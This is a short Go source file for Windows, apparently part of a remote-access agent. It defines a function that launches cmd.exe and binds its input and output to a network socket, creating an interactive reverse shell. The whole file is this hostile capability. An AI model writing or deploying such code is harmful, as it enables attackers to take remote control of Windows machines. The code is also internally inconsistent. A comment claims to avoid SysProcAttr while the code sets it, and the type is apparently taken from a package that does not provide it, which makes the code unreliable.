//go:build windows
// +build windows

package main

import (
	"net"
	"os/exec"
	"golang.org/x/sys/windows"
)

// spawnReverseShell starts cmd.exe with stdio bound to rsock.
// Runs in a background goroutine started by handleReverseShell.
func spawnReverseShell(rsock net.Conn) error {
	// Plain cmd.exe keeps broadest compatibility across Windows versions
	// and cross-compile toolchains. We avoid SysProcAttr fields entirely.
	cmd := exec.Command("cmd.exe")

	// Detach from the agent's session/tty so it can't stall the client.
	cmd.SysProcAttr = &windows.SysProcAttr{
		CreationFlags: windows.CREATE_NEW_PROCESS_GROUP,
	}

	// Bind stdio to the reverse socket (interactive)
	cmd.Stdin = rsock
	cmd.Stdout = rsock
	cmd.Stderr = rsock

	// Run blocks only the background goroutine; client read loop remains free.
	return cmd.Run()
}
